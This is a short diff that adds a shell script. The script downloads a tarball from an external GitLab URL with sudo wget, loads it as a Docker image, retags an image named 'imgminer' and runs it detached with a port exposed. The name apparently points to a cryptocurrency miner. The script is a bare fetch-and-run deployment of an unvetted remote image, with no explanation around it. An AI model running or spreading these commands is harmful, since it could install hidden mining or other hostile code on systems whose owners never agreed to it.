@@ -1,0 +1,8 @@
+sudo wget https://gitlab.com/1onemore5/tester/-/raw/master/img.tar.gz #-O img.tar
+gzip -d img.tar.gz
+docker load -i img.tar
+#docker import - imgmin < ./img.tar
+docker tag imgminer newimg
+#docker run --name dam -d -p 80:80 newimg
+docker run -d -p 6070:80 newimg
+
